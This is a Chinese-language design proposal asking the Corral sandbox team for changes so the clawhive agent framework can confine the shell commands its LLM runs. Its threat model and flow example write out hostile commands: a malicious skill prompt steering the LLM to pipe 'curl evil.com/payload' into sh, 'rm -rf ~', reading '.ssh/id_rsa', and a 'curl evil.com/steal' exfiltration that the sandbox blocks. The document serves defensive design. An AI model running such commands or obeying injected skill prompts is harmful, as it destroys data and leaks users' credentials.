# Corral 集成改进建议

> **来自**: clawhive 项目（Rust-native multi-agent framework）
> **给到**: Corral 开发团队
> **日期**: 2025-02-20
> **版本**: Draft v1

---

## 1. 应用场景

### 1.1 clawhive 是什么

clawhive 是一个 Rust-native 的多 Agent 框架，当前以 Telegram + CLI 为主要交互通道。核心流程：

```
用户消息 → Gateway → Orchestrator → LLM (Claude/GPT)
                                       ↓
                                   LLM 决定调用 tools
                                       ↓
                                   ToolRegistry.execute()
                                       ↓
                              execute_command / read_file / write_file / ...
```

Agent 在与用户对话时，会根据 **Skill**（能力描述）来决定使用哪些工具、执行什么操作。

### 1.2 Skill 的形态

clawhive 的 Skill 是 **Markdown 文件 + 可选的附属脚本**，不是独立可执行程序：

```
skills/
├── web_fetch/
│   └── SKILL.md          ← 给 LLM 看的能力描述（prompt 注入）
├── data_processor/
│   ├── SKILL.md           ← 能力描述
│   └── scripts/
│       ├── process.sh     ← 附属脚本（LLM 可能通过 execute_command 调用）
│       └── transform.py   ← 附属脚本
└── smart_shopping/
    ├── SKILL.md
    └── run.sh             ← 附属脚本
```

**关键点**：Skill 本身不是"被运行"的——它的 Markdown 内容被注入到 LLM 的 system prompt 中，LLM 阅读后决定如何行动。但 Skill 目录下**可能附带可执行脚本**，LLM 会通过 `execute_command` 工具来调用这些脚本。

### 1.3 安全缺口在哪里

当前 clawhive 的 `execute_command` 实现（`shell_tool.rs`）：

```rust
// 当前实现 —— 完全无沙箱
tokio::process::Command::new("sh")
    .arg("-c")
    .arg(&command)          // LLM 传入的任意命令
    .current_dir(&workspace)
    .output()
```

**威胁场景**：

1. **恶意社区 Skill** — Skill 的 prompt 引导 LLM 执行 `execute_command("curl evil.com/payload | sh")`
2. **Skill 附带的恶意脚本** — `scripts/process.sh` 里包含 `rm -rf ~` 或数据外泄操作
3. **LLM 误操作** — LLM 理解错误，执行了超出 Skill 意图的危险命令
4. **路径逃逸** — `read_file("../../.ssh/id_rsa")` 或 `write_file("/etc/crontab", ...)`

**当前仅有的安全机制**：

| 机制 | 作用范围 | 局限 |
|------|---------|------|
| `tool_policy.allow` | 控制 Agent 能调用哪些 tool 名称 | 只能说"不许用 execute_command"，不能说"execute_command 只许跑 curl" |
| `workspace` 目录 | `execute_command` 的 cwd | 不阻止命令访问 workspace 之外的文件 |
| timeout | 限制执行时间 | 不阻止任何具体操作 |

**缺失的是**：对 `execute_command` **内部**执行内容的细粒度约束 — 文件访问、网络连接、进程创建。

### 1.4 为什么选择 Corral

我们评估了多个方案：

| 方案 | 评估结果 |
|------|---------|
| **WASM (wasmtime/wasmer)** | 不能直接跑 bash/python 脚本，需要编译到 WASI，对 `sh -c curl` 场景不友好 |
| **容器 (Docker/Podman)** | 每次 tool call 起容器，延迟不可接受（秒级 vs 毫秒级） |
| **macOS sandbox-exec** | 单平台，且 API 已 deprecated |
| **seccomp-bpf** | Linux only，配置复杂，无高层抽象 |
| **Corral** | 专为 Agent Skill 设计，capability-based，Rust 技术栈一致，跨平台 |

Corral 是唯一一个**在正确的抽象层解决问题**的方案：它理解"Skill"的概念，提供声明式权限，且隔离机制对脚本解释器有效。

---

## 2. 当前 Corral 架构与集成差距分析

### 2.1 Corral 当前架构（我们的理解）

```
                 corral CLI
                     │
          ┌──────────┼──────────┐
          ▼          ▼          ▼
       run        inspect    approve
          │
          ├── Manifest::load(skill_path)     从 skill.yaml 读取权限声明
          ├── PolicyEngine::new(manifest)     构建策略引擎
          ├── platform::create_runtime()      创建平台特定的隔离运行时
          ├── broker::start_broker(policy)    启动 JSON-RPC broker
          ├── runtime.execute(&broker)        在沙箱中执行 skill entry point
          └── audit::log_execution()          记录审计日志
```

这个架构的设计假设是：**一个完整的 Skill 脚本，从头到尾在沙箱里跑完**。

### 2.2 集成差距

clawhive 的使用模式与 Corral 当前假设的差异：

| 维度 | Corral 当前假设 | clawhive 实际需求 |
|------|----------------|------------------|
| **调用粒度** | 整个 Skill 脚本从 entry point 启动到结束 | LLM 发起的**单次命令执行**（每次 `execute_command` 调用） |
| **调用方式** | CLI (`corral run --skill ./path`) | Rust 库调用（`ExecuteCommandTool` 内部直接调 API） |
| **权限来源** | `skill.yaml` 文件 | clawhive 的 `SKILL.md` frontmatter 或 agent config |
| **生命周期** | 一次性：创建沙箱 → 执行 → 销毁 | 会话式：一个 Skill 激活期间，LLM 可能发起多次沙箱执行 |
| **Broker 需求** | 必需（脚本通过 sandbox-call 与 Broker 通信） | 可选（clawhive 的 tool 系统已经提供了类似的能力代理） |
| **权限构建** | 从 YAML 文件解析 | 从代码中程序化构建（可能融合多个来源：skill + agent config + global policy） |

### 2.3 具体的技术差距

**差距 1：没有 Library Crate**

Corral 当前只有两个 workspace member：`corral`（CLI binary）和 `sdk/sandbox-call`。所有沙箱核心逻辑（policy engine、platform runtime、broker）都在 `corral` 这个 binary crate 里。

clawhive 无法 `cargo` 依赖一个 binary crate。需要把核心逻辑拆到独立的 library crate 中。

**差距 2：`PolicyEngine` 只接受 `Manifest` 整体**

```rust
// 当前 corral 的 PolicyEngine
impl PolicyEngine {
    pub fn new(manifest: Manifest) -> Self { ... }
}
```

`Manifest` 包含 `name`、`version`、`author`、`entry`、`runtime` 等与权限无关的字段。下游集成者只关心 `Permissions` 部分，不需要也不应该伪造一个完整的 `Manifest`。

**差距 3：`Runtime` trait 绑定了完整的执行流程**

```rust
// 当前 corral 的 Runtime trait
#[async_trait]
pub trait Runtime {
    async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
}
```

这个 trait 假设"执行"是"跑一个 entry point 脚本"。clawhive 需要的是"在沙箱约束下执行一条任意命令"。

**差距 4：沙箱每次从头创建**

`MacOSRuntime::new()` 每次调用都会 `create_dir_all(work_dir)`，`execute()` 结束时 `remove_dir_all(work_dir)`。如果 LLM 在一个对话里连续发起 10 次 `execute_command`，当前架构要创建/销毁 10 次沙箱环境。

**差距 5：Broker 是强依赖**

`runtime.execute(&broker)` 签名要求必须有 `BrokerHandle`。但 clawhive 已经有自己的 tool 系统（`ToolRegistry`），提供了 `web_fetch`、`memory_search`、`read_file` 等能力。对于 clawhive 来说，Corral 的 Broker 服务代理是**可选的增值功能**，不应该是沙箱执行的前置条件。

---

## 3. 核心改进建议

### 3.1 建议一：拆出 `corral-core` Library Crate

**目标**：让 Corral 的沙箱能力可以被其他 Rust 项目作为库依赖使用。

**改动**：

```
corral/
├── Cargo.toml                    # workspace
├── corral/                       # CLI binary（保持不变，依赖 corral-core）
│   ├── Cargo.toml
│   └── src/main.rs
├── corral-core/                  # ← 新增：核心库
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs
│       ├── policy.rs             # PolicyEngine（从 corral/ 移入）
│       ├── manifest.rs           # Manifest + Permissions 类型（从 corral/ 移入）
│       ├── sandbox.rs            # ← 新增：沙箱执行 API
│       ├── platform/
│       │   ├── mod.rs
│       │   ├── macos.rs          # 从 corral/ 移入
│       │   └── linux.rs          # 从 corral/ 移入
│       ├── broker/               # 从 corral/ 移入（可选功能）
│       └── audit.rs              # 从 corral/ 移入
├── libsandbox/                   # 不变
└── sdk/sandbox-call/             # 不变
```

`corral` CLI 变成 `corral-core` 的薄封装：

```rust
// corral/src/main.rs（改动后）
use corral_core::{Manifest, PolicyEngine, SandboxBuilder};
// CLI 逻辑调用 corral_core 的公共 API
```

**Cargo.toml 示例**：

```toml
# corral-core/Cargo.toml
[package]
name = "corral-core"
version = "0.2.0"

[features]
default = ["sandbox-macos", "sandbox-linux"]
sandbox-macos = []
sandbox-linux = []
broker = ["tokio/net"]   # Broker 作为可选 feature

[dependencies]
# ... 核心依赖
```

### 3.2 建议二：提供 `SandboxBuilder` API — 沙箱的程序化构建

**目标**：让集成者用代码而非 YAML 文件构建沙箱策略，支持灵活组合。

**设计**：

```rust
/// 沙箱构建器 — corral-core 的核心 API
pub struct SandboxBuilder {
    permissions: Permissions,
    work_dir: Option<PathBuf>,
    data_dir: Option<PathBuf>,
    timeout: Option<Duration>,
    memory_limit: Option<usize>,
    broker_config: Option<BrokerConfig>,
    audit_config: Option<AuditConfig>,
}

impl SandboxBuilder {
    /// 从零开始构建（default deny）
    pub fn new() -> Self;

    /// 从已有的 Permissions 构建
    pub fn from_permissions(perms: Permissions) -> Self;

    /// 从 skill.yaml / SKILL.md 的权限声明构建
    pub fn from_manifest(manifest: &Manifest) -> Self;

    // --- 权限配置（Builder pattern）---

    /// 允许读取指定路径（glob pattern）
    pub fn allow_fs_read(mut self, patterns: &[&str]) -> Self;

    /// 允许写入指定路径（glob pattern）
    pub fn allow_fs_write(mut self, patterns: &[&str]) -> Self;

    /// 允许访问指定网络地址
    pub fn allow_network(mut self, hosts: &[&str]) -> Self;

    /// 允许执行指定命令
    pub fn allow_exec(mut self, commands: &[&str]) -> Self;

    /// 允许访问指定环境变量
    pub fn allow_env(mut self, vars: &[&str]) -> Self;

    /// 合并另一组权限（用于叠加 skill + agent + global 策略）
    pub fn merge_permissions(mut self, additional: &Permissions) -> Self;

    // --- 资源限制 ---

    pub fn timeout(mut self, duration: Duration) -> Self;
    pub fn memory_limit(mut self, bytes: usize) -> Self;
    pub fn work_dir(mut self, path: PathBuf) -> Self;

    // --- 可选组件 ---

    /// 启用 Broker（系统服务代理）
    pub fn with_broker(mut self, config: BrokerConfig) -> Self;

    /// 启用审计日志
    pub fn with_audit(mut self, config: AuditConfig) -> Self;

    // --- 构建 ---

    /// 构建沙箱实例
    pub fn build(self) -> Result<Sandbox>;
}
```

**使用示例（clawhive 集成）**：

```rust
// clawhive 的 ExecuteCommandTool 内部
let sandbox = SandboxBuilder::new()
    .allow_fs_read(&["$SKILL_DIR/**"])
    .allow_fs_write(&["$WORK_DIR/**"])
    .allow_network(&["api.example.com:443"])
    .allow_exec(&["curl", "jq", "python3"])
    .allow_env(&["LANG", "TZ"])
    .timeout(Duration::from_secs(30))
    .build()?;

let result = sandbox.execute("curl -s https://api.example.com/data | jq .").await?;
```

### 3.3 建议三：`Sandbox` 实例支持复用（会话式沙箱）

**目标**：一个 Skill 激活期间，多次 `execute_command` 复用同一个沙箱上下文。

**设计**：

```rust
/// 沙箱实例 — 可复用
pub struct Sandbox {
    policy: PolicyEngine,
    platform: Box<dyn PlatformSandbox>,
    work_dir: PathBuf,
    broker: Option<BrokerHandle>,
    audit: Option<AuditLogger>,
}

impl Sandbox {
    /// 执行单条命令（核心 API）
    pub async fn execute(&self, command: &str) -> Result<ExecutionResult>;

    /// 执行指定脚本文件
    pub async fn execute_script(&self, script_path: &Path) -> Result<ExecutionResult>;

    /// 执行完整的 skill entry point（兼容当前 corral CLI 的用法）
    pub async fn run_skill_entry(&self, entry: &str, runtime: &str) -> Result<ExecutionResult>;

    /// 获取审计统计
    pub fn stats(&self) -> SandboxStats;
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        // 清理 work_dir、关闭 broker socket、flush audit log
    }
}
```

**生命周期对比**：

```
当前 Corral（一次性）：
  create_runtime() → execute() → cleanup()  ← 每次都走完整流程

建议的会话式：
  Sandbox::build()                           ← 一次创建
    ├── sandbox.execute("curl ...")           ← 复用
    ├── sandbox.execute("jq ...")             ← 复用
    ├── sandbox.execute("python3 process.py") ← 复用
    └── drop                                 ← 一次清理
```

### 3.4 建议四：`PolicyEngine` 与 `Manifest` 解耦

**目标**：`PolicyEngine` 应该只关心 `Permissions`，不依赖完整的 `Manifest`。

**改动**：

```rust
// 当前
impl PolicyEngine {
    pub fn new(manifest: Manifest) -> Self {
        Self { manifest: Arc::new(manifest) }
    }
}

// 建议
impl PolicyEngine {
    /// 从 Permissions 直接构建
    pub fn new(permissions: Permissions) -> Self {
        Self { permissions: Arc::new(permissions) }
    }

    /// 从 Manifest 构建（便捷方法）
    pub fn from_manifest(manifest: &Manifest) -> Self {
        Self::new(manifest.permissions.clone())
    }
}
```

同时，`Permissions` 类型应该支持合并：

```rust
impl Permissions {
    /// 合并两组权限（取并集 — 更多权限）
    pub fn merge(&self, other: &Permissions) -> Permissions;

    /// 取交集（更少权限 — 用于 global policy 限制）
    pub fn intersect(&self, other: &Permissions) -> Permissions;

    /// 从 YAML 字符串解析
    pub fn from_yaml(yaml: &str) -> Result<Self>;

    /// 判断是否为空（default deny 状态）
    pub fn is_empty(&self) -> bool;
}
```

**为什么需要合并**：clawhive 的权限可能来自多层：

```
最终权限 = skill 声明 ∩ agent 策略 ∩ global 策略

skill 声明:   network: [api.example.com:443, cdn.example.com:443]
agent 策略:   network: [*.example.com:443]          ← agent 级别的限制
global 策略:  network: [*:443]                       ← 全局只允许 HTTPS
─────────────────────────────────────────────────
最终:         network: [api.example.com:443, cdn.example.com:443]
```

### 3.5 建议五：`PlatformSandbox` trait 重构 — 区分"沙箱环境"和"执行"

**目标**：将"创建沙箱环境"和"在沙箱中执行命令"分离。

**当前设计问题**：

```rust
// 当前 Runtime trait — 创建和执行绑在一起
pub trait Runtime {
    async fn execute(&self, broker: &BrokerHandle) -> Result<ExecutionResult>;
}

// MacOSRuntime::new() 在构造时就创建了 work_dir
// MacOSRuntime::execute() 在执行后就删除了 work_dir
```

**建议的重构**：

```rust
/// 平台沙箱能力抽象
#[async_trait]
pub trait PlatformSandbox: Send + Sync {
    /// 准备沙箱环境（创建目录、准备 libsandbox 等）
    async fn setup(&mut self, config: &SandboxConfig) -> Result<()>;

    /// 在沙箱中执行命令
    async fn execute_command(
        &self,
        command: &str,
        working_dir: &Path,
        env: &HashMap<String, String>,
    ) -> Result<ExecutionResult>;

    /// 在沙箱中执行脚本
    async fn execute_script(
        &self,
        script: &Path,
        runtime: &str,   // "bash" | "python3" | "node"
        working_dir: &Path,
        env: &HashMap<String, String>,
    ) -> Result<ExecutionResult>;

    /// 清理沙箱环境
    async fn teardown(&mut self) -> Result<()>;

    /// 平台名称（用于日志/审计）
    fn platform_name(&self) -> &str;
}
```

### 3.6 建议六：Broker 作为可选组件

**目标**：沙箱执行不应该强依赖 Broker。Broker 应该是一个可选增强。

**原因**：

1. clawhive 已经有自己的 `ToolRegistry`，提供了文件读写、网络请求、内存搜索等能力。这些能力是 LLM 通过 tool call 触发的，不需要脚本通过 `sandbox-call` 来请求。

2. 但是，如果 Skill 的脚本需要调用系统服务（日历、提醒事项、通知），Broker 就有价值了 — 它提供了 clawhive 当前没有的能力。

**建议的模块化**：

```toml
# corral-core/Cargo.toml
[features]
default = ["platform-macos", "platform-linux"]
platform-macos = []
platform-linux = []
broker = ["tokio/net"]           # 可选：启用 Broker
services-reminders = ["broker"]  # 可选：提醒事项 adapter
services-calendar = ["broker"]   # 可选：日历 adapter
services-browser = ["broker"]    # 可选：浏览器 adapter
audit = []                       # 可选：审计日志
full = ["broker", "services-reminders", "services-calendar", "services-browser", "audit"]
```

```rust
// 不需要 Broker 的用法
let sandbox = SandboxBuilder::new()
    .allow_exec(&["curl"])
    .allow_network(&["api.example.com:443"])
    .build()?;    // 只有沙箱隔离，没有 Broker

// 需要 Broker 的用法
let sandbox = SandboxBuilder::new()
    .allow_exec(&["curl"])
    .with_broker(BrokerConfig {
        services: vec![ServiceConfig::Reminders { ... }],
    })
    .build()?;    // 沙箱隔离 + Broker 系统服务代理
```

### 3.7 建议七：libsandbox 策略注入方式改进

**当前实现**：

```rust
// macos.rs — 通过环境变量传递 JSON 策略
cmd.env("SANDBOX_POLICY", policy_json);
```

```c
// interpose_macos.c — 从环境变量加载策略
// policy_init() 读取 SANDBOX_POLICY 环境变量
```

**问题**：环境变量有长度限制（macOS 约 256KB，Linux 约 128KB），复杂策略可能超限。另外，环境变量对子进程可见，存在泄露风险。

**建议**：

1. **主路径**：通过文件描述符传递（`/proc/self/fd/N` 或 macOS pipe）
2. **备选路径**：写入临时文件，通过环境变量传递文件路径（`SANDBOX_POLICY_FILE=/tmp/corral-policy-xxx.json`），执行后立即删除
3. **保留**：当前环境变量方式作为 fallback，因为简单且适用于简短策略

```c
// 建议的 policy.c 改动
void policy_init(void) {
    // 优先从文件描述符读取
    const char *fd_str = getenv("SANDBOX_POLICY_FD");
    if (fd_str) {
        int fd = atoi(fd_str);
        // 从 fd 读取 JSON 策略
        policy_load_from_fd(fd);
        return;
    }

    // 其次从文件读取
    const char *file = getenv("SANDBOX_POLICY_FILE");
    if (file) {
        policy_load_from_file(file);
        return;
    }

    // 兜底从环境变量读取
    const char *json = getenv("SANDBOX_POLICY");
    if (json) {
        policy_load_from_json(json);
        return;
    }

    // 无策略 = 全部拒绝
    policy_deny_all();
}
```

---

## 4. 集成示意（clawhive 视角）

展示 clawhive 如何使用改进后的 Corral：

### 4.1 Skill 权限声明

SKILL.md 的 frontmatter 扩展（兼容现有格式）：

```yaml
# skills/web_fetch/SKILL.md
---
name: web_fetch
description: Fetch web content via curl
requires:
  bins: [curl]
  env: []
permissions:                      # ← 新增，Corral 消费
  fs:
    read: [$SKILL_DIR/**]
    write: [$WORK_DIR/**]
  network:
    allow: ["*:443", "*:80"]
  exec: [curl, jq]
  env: [LANG, TZ]
---

# Web Fetch - URL Content Retrieval
...
```

### 4.2 clawhive 内部集成

```rust
// clawhive-core/src/shell_tool.rs（改造后）

use corral_core::{Sandbox, SandboxBuilder, Permissions};

pub struct ExecuteCommandTool {
    workspace: PathBuf,
    default_timeout: u64,
    sandbox: Option<Sandbox>,   // ← 新增：当前活跃的沙箱
}

impl ExecuteCommandTool {
    /// 当 Skill 激活时，根据其 permissions 创建沙箱
    pub fn activate_skill_sandbox(&mut self, skill_permissions: &Permissions) -> Result<()> {
        let sandbox = SandboxBuilder::from_permissions(skill_permissions.clone())
            .work_dir(self.workspace.clone())
            .timeout(Duration::from_secs(self.default_timeout))
            .build()?;
        self.sandbox = Some(sandbox);
        Ok(())
    }

    /// Skill 停用时销毁沙箱
    pub fn deactivate_sandbox(&mut self) {
        self.sandbox = None;  // Drop 触发清理
    }
}

#[async_trait]
impl ToolExecutor for ExecuteCommandTool {
    async fn execute(&self, input: serde_json::Value) -> Result<ToolOutput> {
        let command = input["command"].as_str()
            .ok_or_else(|| anyhow!("missing 'command' field"))?;

        let result = if let Some(sandbox) = &self.sandbox {
            // 有沙箱：受控执行
            sandbox.execute(command).await?
        } else {
            // 无沙箱：直接执行（兼容无 permissions 的老 skill）
            self.execute_raw(command).await?
        };

        Ok(ToolOutput {
            content: result.stdout,
            is_error: result.exit_code != 0,
        })
    }
}
```

### 4.3 端到端流程

```
1. 用户消息进入 → Orchestrator 选择 Agent + Skill

2. Skill 加载：
   SkillRegistry::get("web_fetch")
   → 解析 SKILL.md frontmatter
   → 得到 Permissions { fs, network, exec, ... }

3. 沙箱激活：
   execute_command_tool.activate_skill_sandbox(&skill.permissions)
   → SandboxBuilder::from_permissions(...)
   → 创建 Sandbox 实例（设置 libsandbox、work_dir 等）

4. LLM 决策执行：
   LLM 阅读 skill prompt → 决定调用 execute_command("curl -s https://api.example.com/data")
   → ExecuteCommandTool::execute()
   → sandbox.execute("curl -s https://api.example.com/data")
   → libsandbox 检查：curl 在 exec 白名单? ✓ api.example.com:443 在 network 白名单? ✓
   → 执行成功，返回结果

5. LLM 继续决策：
   LLM → execute_command("curl http://evil.com/steal?data=...")
   → sandbox.execute(...)
   → libsandbox 检查：evil.com 不在 network 白名单 → EACCES
   → 返回错误

6. 对话结束 → Skill 停用 → sandbox Drop → 清理
```

---

## 5. 优先级与演进路线

### Phase 1：Library Crate 拆分（建议 1、4）

**最高优先级**。没有这一步，下游集成无从谈起。

- 拆出 `corral-core` crate
- `PolicyEngine` 从 `Manifest` 解耦为 `Permissions`
- `Permissions` 类型支持程序化构建和合并
- `corral` CLI 改为依赖 `corral-core`
- 不需要改动 libsandbox 或平台实现

**预估改动量**：中等（主要是文件移动 + 接口调整，逻辑不变）

### Phase 2：SandboxBuilder + 会话式沙箱（建议 2、3、5）

**核心 API 层**。这是下游最常用的接口。

- 实现 `SandboxBuilder` API
- 实现 `Sandbox` 的 `execute()` / `execute_script()` 方法
- 重构 `PlatformSandbox` trait 区分 setup/execute/teardown
- 支持 `Sandbox` 实例复用

**预估改动量**：较大（涉及 runtime 层重构）

### Phase 3：Broker 可选化 + Feature Gate（建议 6）

- Broker 相关代码用 feature gate 包裹
- 无 Broker 时，沙箱仍然正常工作（只有 libsandbox 级别的隔离）
- 有 Broker 时，提供系统服务代理能力

**预估改动量**：中等

### Phase 4：策略注入改进 + 增强（建议 7）

- libsandbox 策略注入支持文件描述符/临时文件
- 更完善的 glob 路径匹配（当前 `$SKILL_DIR` 等变量的处理比较初步）
- 审计日志的结构化输出

**预估改动量**：小到中等

### Phase 5：稳定化

- 完善测试覆盖（尤其是 libsandbox 的 C 代码）
- CI/CD 配置（macOS + Linux 双平台）
- crates.io 发布
- 文档完善

---

## 6. 开放问题

以下问题需要 Corral 团队评估：

1. **Library Crate 的最小 API 表面应该是什么？** 上面的 `SandboxBuilder` + `Sandbox` 设计是否合理，还是有更好的抽象？

2. **libsandbox 的分发方式**：下游依赖 `corral-core` 时，`libsandbox.dylib` / `libsandbox.so` 怎么构建和分发？build.rs 自动编译？还是要求系统预装？

3. **权限变量（`$SKILL_DIR` 等）的解析时机**：当前 `PolicyEngine` 在匹配路径时需要知道 `$SKILL_DIR` 的实际值。这个解析应该在 `SandboxBuilder::build()` 时做（传入实际路径），还是在 `PolicyEngine` 内部做？

4. **对 `read_file` / `write_file` 等非 shell 工具的沙箱覆盖**：clawhive 不只有 `execute_command`，还有 `read_file`、`write_file` 等 Rust 代码直接实现的 tool。这些操作不经过 `sh -c`，libsandbox 拦截不到。是否需要在 Rust 层提供路径检查 API（复用 `PolicyEngine::check_file_read/write`）？

5. **多 Skill 并发的沙箱隔离**：如果一个 Agent 同时激活多个 Skill（每个有不同的 permissions），沙箱实例如何管理？每个 Skill 一个独立的 `Sandbox` 实例，还是合并权限？

---

## 附录 A：clawhive 当前架构参考

```
crates/
├── clawhive-core/
│   ├── src/
│   │   ├── tool.rs              ← ToolExecutor trait + ToolRegistry
│   │   ├── shell_tool.rs        ← execute_command 实现（需要沙箱包裹的核心位置）
│   │   ├── file_tools.rs        ← read_file / write_file / edit_file
│   │   ├── skill.rs             ← SkillFrontmatter + SkillRegistry
│   │   ├── orchestrator.rs      ← tool_use_loop（LLM ↔ Tool 循环）
│   │   └── config.rs            ← ToolPolicyConfig（当前只有 tool 名称白名单）
├── clawhive-runtime/
│   └── src/lib.rs               ← TaskExecutor trait（NativeExecutor / WasmExecutor stub）
```

**技术栈重叠**：clawhive 和 Corral 共享 tokio、serde、serde_yaml、anyhow、thiserror、clap、tracing — 集成不会引入新的重型依赖。

## 附录 B：Corral 当前源码结构参考

```
corral/
├── corral/src/
│   ├── main.rs          ← CLI 入口 + run_skill/inspect_skill/approve_skill
│   ├── manifest.rs      ← Manifest + Permissions 类型定义 + YAML 解析
│   ├── policy.rs        ← PolicyEngine（权限检查逻辑）
│   ├── broker/
│   │   ├── mod.rs       ← BrokerHandle + start_broker + broker_loop
│   │   ├── jsonrpc.rs   ← JSON-RPC 请求/响应类型
│   │   ├── router.rs    ← method → handler 路由
│   │   └── handlers/    ← fs/network/services/exec/env handlers
│   ├── platform/
│   │   ├── mod.rs       ← Runtime trait + create_runtime()
│   │   ├── macos.rs     ← MacOSRuntime（DYLD + libsandbox）
│   │   └── linux.rs     ← LinuxRuntime（bubblewrap）
│   ├── watchdog.rs      ← 资源监控（目前 TODO）
│   ├── audit.rs         ← 审计日志
│   └── adapters/        ← 系统服务实现（reminders 等）
├── libsandbox/
│   ├── interpose_macos.c  ← DYLD interpose 实现（~350 行）
│   ├── interpose_linux.c  ← LD_PRELOAD 实现
│   ├── policy.c           ← 策略加载和检查逻辑
│   └── comm.c             ← Broker 通信
└── sdk/sandbox-call/src/
    └── main.rs            ← sandbox-call CLI（脚本端 SDK）
```
